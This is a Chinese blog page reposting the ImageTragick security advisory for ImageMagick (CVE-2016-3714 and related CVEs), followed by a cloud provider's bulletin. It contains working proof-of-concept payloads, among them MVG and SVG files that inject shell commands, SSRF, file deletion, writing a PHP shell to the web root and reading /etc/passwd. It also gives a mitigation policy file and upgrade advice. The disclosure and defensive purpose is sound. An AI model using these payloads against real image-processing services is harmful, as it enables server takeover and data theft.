<!DOCTYPE html>


  

<html class="theme-next muse use-motion" lang="zh-Hans">
<head> 
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.cat.net/css?family=Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/lqz.jpg?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/lqz.jpg?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/lqz.jpg?v=5.1.3">






  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="from https://imagetragick.com/   ================================= ImageTragickMake ImageMagick Great Again Updated 5/5Updated Policy RecommendationUpdated 5/4What’s with the stupid (logo|website|twit">
<meta property="og:type" content="website">
<meta property="og:title" content=" ImageTragick 远程命令执行漏洞安全公告">
<meta property="og:url" content="https://www.yf2017.top/newPost/ImageTragick-远程命令执行漏洞安全公告.html">
<meta property="og:site_name" content="蓝旗子">
<meta property="og:description" content="from https://imagetragick.com/   ================================= ImageTragickMake ImageMagick Great Again Updated 5/5Updated Policy RecommendationUpdated 5/4What’s with the stupid (logo|website|twit">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2018-10-18T05:05:07.951Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content=" ImageTragick 远程命令执行漏洞安全公告">
<meta name="twitter:description" content="from https://imagetragick.com/   ================================= ImageTragickMake ImageMagick Great Again Updated 5/5Updated Policy RecommendationUpdated 5/4What’s with the stupid (logo|website|twit">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.yf2017.top/newPost/ImageTragick-远程命令执行漏洞安全公告.html"/>





  <title> ImageTragick 远程命令执行漏洞安全公告 | 蓝旗子</title>
  








<script type="text/javascript" src="/js/src/love.js"></script>
<script src="/lib/syntaxhighlighter/syntaxhighlighter.js"></script>
<link type="text/css" rel="stylesheet" href="/lib/syntaxhighlighter/theme.css">
<style type="text/css">
  .syntaxhighlighter table td.code{
    width:93% !important;
  }
  </style>
</head>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
  
  
    
  
  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">蓝旗子</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-daohang">
          <a href="/2018/09/05/daohang/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            导航
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>
    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    
    
    
    <div class="post-block page">
      <header class="post-header">

	<h2 class="post-title" itemprop="name headline"> ImageTragick 远程命令执行漏洞安全公告</h2>



</header>

      
      
      
      <div class="post-body">
        
        
          <p>from <a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a>  </p>
<p>=================================</p>
<h1 id="ImageTragick"><a href="#ImageTragick" class="headerlink" title="ImageTragick"></a>ImageTragick</h1><p><em>Make ImageMagick Great Again</em></p>
<p><em>Updated 5/5</em><br><a href="https://imagetragick.com/#policy" target="_blank" rel="noopener">Updated Policy Recommendation</a><br><em>Updated 5/4</em><br><a href="https://imagetragick.com/#why" target="_blank" rel="noopener">What’s with the stupid (logo|website|twitter account)?</a><br><a href="https://imagetragick.com/#info" target="_blank" rel="noopener">Detailed Vulnerability Information</a><br><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">PoC</a><br><em>Updated 5/3</em><br><a href="https://imagetragick.com/#FAQ" target="_blank" rel="noopener">FAQs</a>  </p>
<h2 id="ImageMagick-Is-On-Fire-—-CVE-2016–3714"><a href="#ImageMagick-Is-On-Fire-—-CVE-2016–3714" class="headerlink" title="ImageMagick Is On Fire — CVE-2016–3714"></a>ImageMagick Is On Fire — CVE-2016–3714</h2><h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><p>There are multiple vulnerabilities in <a href="https://www.imagemagick.org/" target="_blank" rel="noopener">ImageMagick</a>, a package commonly used by web services to process images. One of the vulnerabilities can lead to remote code execution (RCE) if you process user submitted images. The exploit for this vulnerability is being used in the wild.</p>
<p>A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP’s imagick, Ruby’s rmagick and paperclip, and nodejs’s imagemagick.</p>
<p>If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one of these two things (but preferably both!):</p>
<ol>
<li><p>Verify that all image files begin with the expected <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener">“magic bytes”</a> corresponding to the image file types you support before sending them to ImageMagick for processing. (see <a href="https://imagetragick.com/#FAQ" target="_blank" rel="noopener">FAQ</a> for more info)</p>
</li>
<li><p>Use a <a href="https://www.imagemagick.org/script/resources.php" target="_blank" rel="noopener">policy file</a> to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in “/etc/ImageMagick”. The below policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL.</p>
</li>
</ol>
<h3 id="policy-xml-updated-5-5"><a href="#policy-xml-updated-5-5" class="headerlink" title="policy.xml (updated 5/5)"></a>policy.xml (updated 5/5)</h3><policymap><br>  <policy domain="coder" rights="none" pattern="EPHEMERAL"><br>  <policy domain="coder" rights="none" pattern="URL"><br>  <policy domain="coder" rights="none" pattern="HTTPS"><br>  <policy domain="coder" rights="none" pattern="MVG"><br>  <policy domain="coder" rights="none" pattern="MSL"><br>  <policy domain="coder" rights="none" pattern="TEXT"><br>  <policy domain="coder" rights="none" pattern="SHOW"><br>  <policy domain="coder" rights="none" pattern="WIN"><br>  <policy domain="coder" rights="none" pattern="PLT"><br></policy></policy></policy></policy></policy></policy></policy></policy></policy></policymap>

<h3 id="What’s-with-the-stupid-logo-website-twitter-account"><a href="#What’s-with-the-stupid-logo-website-twitter-account" class="headerlink" title="What’s with the stupid (logo|website|twitter account)?"></a>What’s with the stupid (logo|website|twitter account)?</h3><p>It would have been fantastic to eschew this ridiculousness, because we all make fun of branded vulnerabilities too, but this was not the right time to make that stand.</p>
<p>Initially, we disclosed this vulnerability via a blog post on Medium. We even joked in the post that the vulnerability didn’t have a cool name or logo. The blog was read hundreds of times, but as the hours passed, we became worried that not enough people were aware of the vulnerability. Every script kiddie would have it in their hands soon, but a majority of people had no idea this vulnerability existed.</p>
<p>So we created a website, a twitter account, and used a logo that someone created as a joke the day before.</p>
<p>What happened?</p>
<p>We had thousands of hits in the first 15 minutes. We were at the top of hacker news, which a lot of people see. We were getting the word out on something tragickally simple to exploit. We’d do it again.</p>
<h3 id="Detailed-Vulnerability-Information"><a href="#Detailed-Vulnerability-Information" class="headerlink" title="Detailed Vulnerability Information"></a>Detailed Vulnerability Information</h3><p>Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in ImageMagick. We’ve reported these issues to developers of ImageMagick and they made a fix for RCE in sources and released new version (6.9.3-9 released 2016-04-30 <a href="http://legacy.imagemagick.org/script/changelog.php" target="_blank" rel="noopener">changelog</a>), but this fix seems to be incomplete. We are still working with developers.</p>
<h4 id="ImageMagick-Multiple-vulnerabilities-in-image-decoder"><a href="#ImageMagick-Multiple-vulnerabilities-in-image-decoder" class="headerlink" title="ImageMagick: Multiple vulnerabilities in image decoder"></a>ImageMagick: Multiple vulnerabilities in image decoder</h4><h5 id="1-CVE-2016-3714-Insufficient-shell-characters-filtering-leads-to-potentially-remote-code-execution"><a href="#1-CVE-2016-3714-Insufficient-shell-characters-filtering-leads-to-potentially-remote-code-execution" class="headerlink" title="1. CVE-2016-3714 - Insufficient shell characters filtering leads to(potentially remote) code execution"></a>1. CVE-2016-3714 - Insufficient shell characters filtering leads to(potentially remote) code execution</h5><p><em>Insufficient filtering for filename passed to delegate’s command allows remote code execution during conversion of several file formats.</em></p>
<p>ImageMagick allows to process files with external libraries. This feature is called ‘delegate’. It is implemented as a system() with command string (‘command’) from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate’s command is used to handle https requests:</p>
<p>“wget” -q -O “%o” “https:%M”</p>
<p>where <code>%M</code> is the actual link from the input. It is possible to pass the value like</p>
<p>`<a href="https://example.com&quot;;|ls" target="_blank" rel="noopener">https://example.com&quot;;|ls</a> “-la`</p>
<p>and execute unexpected <code>&#39;ls -la&#39;</code>. (wget or curl should be installed)</p>
<p>$ convert ‘<a href="https://example.com&quot;;|ls" target="_blank" rel="noopener">https://example.com&quot;;|ls</a> “-la’ out.png<br>total 32<br>drwxr-xr-x 6 user group 204 Apr 29 23:08 .<br>drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..</p>
<p>The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to <a href="https://hackerone.com/stewie" target="_blank" rel="noopener">Stewie</a> for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default <code>delegates.xml</code> / <code>policy.xml</code>, may be vulnerable to this issue.</p>
<p><strong>exploit.mvg</strong></p>
<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;;|ls" target="_blank" rel="noopener">https://example.com/image.jpg&quot;;|ls</a> “-la)’<br>pop graphic-context</p>
<p><strong>exploit.svg</strong></p>
<p>&lt;?xml version=”1.0” standalone=”no”?&gt;<br>&lt;!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN”<br>“<a href="http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;;&gt;" target="_blank" rel="noopener">http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;;&gt;</a></p>
&lt;svg width=”640px” height=”480px” version=”1.1”<br>xmlns=”<a href="http://www.w3.org/2000/svg&quot;" target="_blank" rel="noopener">http://www.w3.org/2000/svg&quot;</a>; xmlns:xlink=<br>“<a href="http://www.w3.org/1999/xlink&quot;;&gt;" target="_blank" rel="noopener">http://www.w3.org/1999/xlink&quot;;&gt;</a><br><image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"><br>

<p><strong>Example execution</strong></p>
<p>$ convert exploit.mvg out.png<br>total 32<br>drwxr-xr-x 6 user group 204 Apr 29 23:08 .<br>drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..</p>
<p>ImageMagick tries to guess the type of the file by it’s content, so exploitation doesn’t depend on the file extension. You can rename <code>exploit.mvg</code> to <code>exploit.jpg</code> or <code>exploit.png</code> to bypass file type checks. In addition, ImageMagick’s tool <code>identify</code> is also vulnerable, so it can’t be used as a protection to filter file by it’s content and creates additional attack vectors (e.g. via <code>less exploit.jpg</code>‘, because <code>identify</code> is invoked via <code>lesspipe.sh</code>).</p>
<p>Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick’s svg parser should be used, not rsvg.</p>
<p><strong>All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.</strong></p>
<h5 id="2-CVE-2016-3718-SSRF"><a href="#2-CVE-2016-3718-SSRF" class="headerlink" title="2. CVE-2016-3718 - SSRF"></a>2. CVE-2016-3718 - SSRF</h5><p>It is possible to make HTTP GET or FTP request:</p>
<p><strong>ssrf.mvg</strong></p>
<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="http://example.com/)&#39;" target="_blank" rel="noopener">http://example.com/)&#39;</a><br>pop graphic-context</p>
<p><strong>the following then makes an http request to example.com</strong></p>
<p>$ convert ssrf.mvg out.png</p>
<h5 id="3-CVE-2016-3715-File-deletion"><a href="#3-CVE-2016-3715-File-deletion" class="headerlink" title="3. CVE-2016-3715 - File deletion"></a>3. CVE-2016-3715 - File deletion</h5><p>It is possible to delete files by using ImageMagick’s ‘ephemeral’ pseudo protocol which deletes files after reading:</p>
<p><strong>delete_file.mvg</strong></p>
<p>push graphic-context<br>viewbox 0 0 640 480<br>image over 0,0 0,0 ‘ephemeral:/tmp/delete.txt’<br>popgraphic-context</p>
<p>$ touch /tmp/delete.txt<br>$ convert delete_file.mvg out.png # deletes /tmp/delete.txt</p>
<h5 id="4-CVE-2016-3716-File-moving"><a href="#4-CVE-2016-3716-File-moving" class="headerlink" title="4. CVE-2016-3716 - File moving"></a>4. CVE-2016-3716 - File moving</h5><p>It is possible to move image files to file with any extension in any folder by using ImageMagick’s ‘msl’ pseudo protocol. msl.txt and image.gif should exist in known location - <code>/tmp/</code> for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):</p>
<p><strong>file_move.mvg</strong></p>
<p>push graphic-context<br>viewbox 0 0 640 480<br>image over 0,0 0,0 ‘msl:/tmp/msl.txt’<br>popgraphic-context</p>
<p><strong>/tmp/msl.txt</strong></p>
<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
<image><br><read filename="/tmp/image.gif"><br><write filename="/var/www/shell.php"><br></write></read></image>

<p><code>/tmp/image.gif</code> - image with php shell inside (<a href="https://www.secgeek.net/POC/POC.gif" target="_blank" rel="noopener">https://www.secgeek.net/POC/POC.gif</a> for example)</p>
<p>$ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php</p>
<h5 id="5-CVE-2016-3717-Local-file-read-independently-reported-by-original-research-author-Stewie"><a href="#5-CVE-2016-3717-Local-file-read-independently-reported-by-original-research-author-Stewie" class="headerlink" title="5. CVE-2016-3717 - Local file read (independently reported by original research author -Stewie)"></a>5. CVE-2016-3717 - Local file read (independently reported by original research author -<a href="https://hackerone.com/stewie" target="_blank" rel="noopener">Stewie</a>)</h5><p>It is possible to get content of the files from the server by using ImageMagick’s ‘label’ pseudo protocol:</p>
<p><strong>file_read.mvg</strong></p>
<p>push graphic-context<br>viewbox 0 0 640 480<br>image over 0,0 0,0 ‘label:@/etc/passwd’<br>pop graphic-context</p>
<p>$ convert file_read.mvg out.png</p>
<p>produces file with text rendered from /etc/passwd</p>
<h5 id="Vulnerability-Disclosure-Timeline"><a href="#Vulnerability-Disclosure-Timeline" class="headerlink" title="Vulnerability Disclosure Timeline:"></a>Vulnerability Disclosure Timeline:</h5><ul>
<li><p>April, 21 2016 - file read vulnerability report for one of My.Com services from <a href="https://hackerone.com/stewie" target="_blank" rel="noopener">https://hackerone.com/stewie</a> received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team.</p>
</li>
<li><p>April, 21 2016 - file read vulnerability patched by My.Com development team</p>
</li>
<li><p>April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report</p>
</li>
<li><p>April, 30 2016 - code execution vulnerability reported to ImageMagick development team</p>
</li>
<li><p>April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix)</p>
</li>
<li><p>April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix)</p>
</li>
<li><p>May, 1 2016 - ImageMagic informed of the fix bypass</p>
</li>
<li><p>May, 2 2016 - limited disclosure to ‘distros’ mailing list</p>
</li>
<li><p>May, 3 2016 - public disclosure at <a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></p>
</li>
</ul>
<h2 id="FAQs"><a href="#FAQs" class="headerlink" title="FAQs"></a>FAQs</h2><h5 id="Who-found-this-bug"><a href="#Who-found-this-bug" class="headerlink" title="Who found this bug?"></a><em>Who found this bug?</em></h5><p><a href="https://hackerone.com/stewie" target="_blank" rel="noopener">Stewie</a> found the initial bug, and <a href="https://twitter.com/__sl1m" target="_blank" rel="noopener">Nikolay Ermishkin</a> from the Mail.Ru Security Team found additional issues, including the RCE.</p>
<h5 id="Will-you-share-the-exploit-with-me"><a href="#Will-you-share-the-exploit-with-me" class="headerlink" title="Will you share the exploit with me?"></a><em>Will you share the exploit with me?</em></h5><p>No. We would like to give people a chance to patch before it is more widely available. The exploit is trivial, so we expect it to be available within hours of this post. Updates and PoC will eventually be available here.</p>
<h5 id="What-are-“magic-bytes”"><a href="#What-are-“magic-bytes”" class="headerlink" title="What are “magic bytes”?"></a><em>What are “magic bytes”?</em></h5><p>The first few bytes of a file can often used to identify the type of file. Some examples are GIF images, which start with the hex bytes <strong>“47 49 46 38”</strong>, and JPEG images, which start with <strong>“FF D8”</strong>. <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener">This list</a>on Wikipedia has the magic bytes for most common file types.</p>
<h5 id="Why-are-you-disclosing-a-vulnerability-like-this"><a href="#Why-are-you-disclosing-a-vulnerability-like-this" class="headerlink" title="Why are you disclosing a vulnerability like this?"></a><em>Why are you disclosing a vulnerability like this?</em></h5><p>We have collectively determined that these vulnerabilities are available to individuals other than the person(s) who discovered them. An unknowable number of people having access to these vulnerabilities makes this a critical issue for everyone using this software. <a href="https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&amp;t=29588" target="_blank" rel="noopener">ImageMagick also disclosed this on their forum a few hours ago</a>.</p>
<h5 id="How-well-tested-are-these-mitigations"><a href="#How-well-tested-are-these-mitigations" class="headerlink" title="How well-tested are these mitigations?"></a><em>How well-tested are these mitigations?</em></h5><p>They are effective against all of the exploit samples we’ve seen, but we cannot guarantee they will eliminate all vectors of attack.</p>
<h5 id="Are-there-other-ways-to-mitigate"><a href="#Are-there-other-ways-to-mitigate" class="headerlink" title="Are there other ways to mitigate?"></a><em>Are there other ways to mitigate?</em></h5><p>Sandboxing ImageMagick is worth investigating, but we are not providing specific instructions for doing this.</p>
<h5 id="Why-is-this-post-so-short"><a href="#Why-is-this-post-so-short" class="headerlink" title="Why is this post so short?"></a><em>Why is this post so short?</em></h5><p>We did not find this vulnerability ourselves. We understand the mechanisms involved, but credit for finding this vulnerability should go to the researcher(s).</p>
<h5 id="How-can-I-contact-you"><a href="#How-can-I-contact-you" class="headerlink" title="How can I contact you?"></a><em>How can I contact you?</em></h5><p><a href="mailto:imagetragick@gmail.com" target="_blank" rel="noopener">imagetragick@gmail.com</a></p>
<h5 id="Who-is-“we”"><a href="#Who-is-“we”" class="headerlink" title="Who is “we”?"></a><em>Who is “we”?</em></h5><p>Us.</p>
<p>ImageTragick 远程命令执行漏洞安全公告如下。(本文转自百度开放云）</p>
<p>一、风险简述：</p>
<p>近日 ImageMagick被爆出存在一处远程命令执行漏洞（CVE-2016–3714），当其处理的上传图片带有攻击代码时，攻击代码中的远程命令将会被执行，进而可能控制服务器。</p>
<p>此漏洞被命名为ImageTragick ，网站介绍：<a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a> 。</p>
<p>说明：ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。可能的影响范围包括各类流行的内容管理系统（CMS）、集成运行环境（LAMP）等。</p>
<p>二、影响范围：</p>
<p>直接或间接使用了ImageMagick，且允许用户上传图像的网站或服务，将会受此漏洞影响，举例如下：</p>
<p>1、 调用ImageMagick的库实现图片处理和渲染的应用。</p>
<pre><code>ImageMagick 为多种语言提供了api，具体可参考[http://www.imagemagick.org/script/api.php](http://www.imagemagick.org/script/api.php) 。
</code></pre><p>2、很多流行的内容管理系统（CMS）使用了ImageMagick，例如Wordpress的图片处理插件已被证实存在远程命令执行的漏洞（Author 及以上权限用户执行）。其他例如MediaWiki、phpBB和vBulletin 使用了ImageMagick 库生成缩略图，还有一些程序如LyX使用ImageMagick转换图片格式。以上应用可能受到此漏洞影响。</p>
<p>3、如果通过shell 中的convert 命令实现一些图片处理功能，也会受到此漏洞影响。</p>
<p>三、漏洞验证方法：</p>
<p>若系统中安装使用了ImageMagick ，本地执行如下命令：</p>
<pre><code>root@mysystem:~#convert &apos;https://example.com&quot;|ls &quot;-la&apos; out.png
</code></pre><p>若ls -la 命令成功执行，说明存在漏洞。</p>
<p>四、修复建议：</p>
<p>升级ImageMagick到最新版本7.0.1-1，可参考官方说明：<a href="http://www.imagemagick.org/script/binary-releases.php" target="_blank" rel="noopener">http://www.imagemagick.org/script/binary-releases.php</a> 。</p>
<p>在修复前建议先创建实例快照，避免修复失败对业务造成影响。</p>
</image>
        
      </div>
      
      
      
    </div>
    
    
    
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="Caigen Lee" />
            
              <p class="site-author-name" itemprop="name">Caigen Lee</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

			<!--my custom code begin-->
			<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
			<script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"></script>
			<script type="text/javascript">
			  $("#sidebar").hover(function(){
				$("#mydivshow").velocity('stop').velocity({opacity: 1});
			  },function(){
				$("#mydivshow").velocity('stop').velocity({opacity: 0});
			  });
			</script>
			<div id="mydivshow" class="mydivshow">
			<!--my custom code end-->
			
          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">312</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/leegtang" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
            
          </div>

          
          

          
          

          <div id="player1" class="aplayer"></div>
<script src="/js/src/APlayer.min.js"></script>
<script type="text/javascript">
var ap = new APlayer({
    element: document.getElementById('player1'),                       // Optional, player element
    narrow: false,                                                     // Optional, narrow style
    autoplay: false,                                                    // Optional, autoplay song(s), not supported by mobile browsers
    showlrc: 0,                                                        // Optional, show lrc, can be 0, 1, 2, see: ###With lrc
    mutex: true,                                                       // Optional, pause other players when this player playing
    theme: '#e6d0b2',                                                  // Optional, theme color, default: #b7daff
    mode: 'random',                                                    // Optional, play mode, can be `random` `single` `circulation`(loop) `order`(no loop), default: `circulation`
    preload: 'metadata',                                               // Optional, the way to load music, can be 'none' 'metadata' 'auto', default: 'auto'
    listmaxheight: '513px',                                             // Optional, max height of play list
    music: [
        {
            title: '楽園PROJECT',                                          // Required, music title
            author: 'Ray',                          // Required, music author
            url: '/music/Ray%20-%20%E6%A5%BD%E5%9C%92PROJECT.mp3'
        },
        {
            title: '恋人を射ち堕とした日',
            author: 'Sound Horizon',
            url: '/music/Sound%20Horizon%20-%20%E6%81%8B%E4%BA%BA%E3%82%92%E5%B0%84%E3%81%A1%E5%A0%95%E3%81%A8%E3%81%97%E3%81%9F%E6%97%A5%20_%20Koibito%20wo%20Uchiotoshia%20Hi.mp3'
        },
        {
            title: 'cat\'s dance',
            author: 'すーぱーそに子',
            url: '/music/%E3%81%99%E3%83%BC%E3%81%B1%E3%83%BC%E3%81%9D%E3%81%AB%E5%AD%90%20-%20cat%27s%20dance.mp3'
        }]
});
</script>
        </div>
		<!--my custom code begin-->
		</div>
		<!--my custom code end-->
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ImageTragick"><span class="nav-number">1.</span> <span class="nav-text">ImageTragick</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageMagick-Is-On-Fire-—-CVE-2016–3714"><span class="nav-number">1.1.</span> <span class="nav-text">ImageMagick Is On Fire — CVE-2016–3714</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TL-DR"><span class="nav-number">1.1.1.</span> <span class="nav-text">TL;DR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#policy-xml-updated-5-5"><span class="nav-number">1.1.2.</span> <span class="nav-text">policy.xml (updated 5/5)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#What’s-with-the-stupid-logo-website-twitter-account"><span class="nav-number">1.1.3.</span> <span class="nav-text">What’s with the stupid (logo|website|twitter account)?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Detailed-Vulnerability-Information"><span class="nav-number">1.1.4.</span> <span class="nav-text">Detailed Vulnerability Information</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ImageMagick-Multiple-vulnerabilities-in-image-decoder"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">ImageMagick: Multiple vulnerabilities in 